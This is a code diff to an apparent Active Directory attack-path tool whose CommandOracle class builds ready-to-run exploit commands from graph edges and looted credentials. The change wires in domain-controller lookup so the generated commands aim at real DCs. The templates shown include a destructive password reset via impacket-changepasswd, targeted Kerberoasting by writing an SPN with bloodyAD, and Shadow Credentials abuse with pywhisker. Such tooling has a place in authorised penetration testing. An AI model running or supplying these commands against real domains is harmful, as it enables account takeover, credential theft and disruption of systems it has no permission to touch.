@@ -3,8 +3,12 @@
 from __future__ import annotations
 
 from dataclasses import dataclass
+from typing import TYPE_CHECKING
 
 from engine.loot import LootManager
+
+if TYPE_CHECKING:
+    from engine.graph_logic import NanoGraphEngine
 
 
 EDGE_TOOL_MAP: dict[str, str] = {
@@ -32,8 +36,9 @@ class NodeContext:
 class CommandOracle:
     """Generate ready-to-run commands from edge context and available loot."""
 
-    def __init__(self, loot_manager: LootManager) -> None:
+    def __init__(self, loot_manager: LootManager, graph_engine: NanoGraphEngine | None = None) -> None:
         self.loot_manager = loot_manager
+        self.graph_engine = graph_engine
 
     def _infer_domain(self, source_node: NodeContext, target_node: NodeContext) -> str:
         for candidate in (source_node.domain, target_node.domain):
@@ -67,6 +72,14 @@ class CommandOracle:
         if flags:
             return flags
         return self.loot_manager.build_auth_flags(source_node.name)
+
+    def _find_dc_for_domain(self, domain: str) -> str:
+        """Find a DC hostname for the given domain, or return placeholder."""
+        if not self.graph_engine or not domain:
+            return "<DC_IP_OR_HOSTNAME>"
+        
+        dc = self.graph_engine.find_dc_for_domain(domain)
+        return dc or "<DC_IP_OR_HOSTNAME>"
 
     def get_exploit_command(
         self,
@@ -229,7 +242,7 @@ class CommandOracle:
                 elif source_cred.password:
                     alt_auth_flag = f"-altpass \"{source_cred.password}\""
             
-            target_host = "<DC_IP_OR_HOSTNAME>"
+            target_host = self._find_dc_for_domain(domain)
             alt_user = source.name or f"{domain}\\{username}"
             alt_user_part = f"-altuser {alt_user}"
             
@@ -474,17 +487,18 @@ class CommandOracle:
                 
                 alt_user = source.name or f"{domain}\\{username}"
                 cmd_args = f"-altuser {alt_user} {alt_auth_flag}".strip() if alt_auth_flag else f"-altuser {alt_user} -altpass \"<PASSWORD>\""
+                dc_host = self._find_dc_for_domain(domain)
                 
                 return (
                     f"# GenericWrite on USER: multiple abuse paths\n"
                     f"# 1) Reset password via LDAP (impacket-changepasswd)\n"
                     f"# WARNING: This will change the target user's password. This is a destructive action.\n"
                     f"impacket-changepasswd {cmd_args} -protocol ldap -newpass \"NanoPwned123!\" "
-                    f"-reset {domain}/{target_user}@<DC_IP>\n"
+                    f"-reset {domain}/{target_user}@{dc_host}\n"
                     f"# 2) Targeted Kerberoast by writing SPN\n"
-                    f"bloodyAD --host <DC_IP> -d {domain} -u {username}{auth_part} "
+                    f"bloodyAD --host {dc_host} -d {domain} -u {username}{auth_part} "
                     f"set object '{target_object}' servicePrincipalName -v 'HTTP/{target_object}'\n"
-                    f"impacket-GetUserSPNs -dc-ip <DC_IP> -request {domain}/{username}{auth_part}\n"
+                    f"impacket-GetUserSPNs -dc-ip {dc_host} -request {domain}/{username}{auth_part}\n"
                     f"# 3) Shadow Credentials (msDS-KeyCredentialLink)\n"
                     f"pywhisker -d {domain} -u {username}{auth_part} "
                     f"--target '{target_object}' --action add"
